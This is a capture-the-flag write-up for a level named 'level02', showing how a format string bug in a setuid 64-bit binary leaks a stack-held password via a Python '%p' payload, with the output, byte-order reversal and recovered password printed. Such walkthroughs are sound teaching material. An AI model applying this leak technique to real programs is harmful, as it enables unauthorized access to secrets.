# level02

```sh
$> file -b level02 
setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

We know that the `buffer` is in the stack and is filled with the password we want.  
We can see that `printf` is vulnerable to a format string vulnerability.  
Thus we can print the stack to find the password.  
A small thing to have in mind is that the executable is a 64-bit ELF file, so we need to use `%lx` to print addresses.

```sh
$> python -c 'print("%p "*27); print("")' | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil)  does not have access!
```

We can see that there's 40 bytes of informations at the end :

```
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
```

We have to reverse the endianness of the hexadecimal numbers to get the password.

```
4868373452506E75 51397361354A4145 58674E5743717A37 7358476E68354A35 4D394B6650673348
```

And translate them to ascii :

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
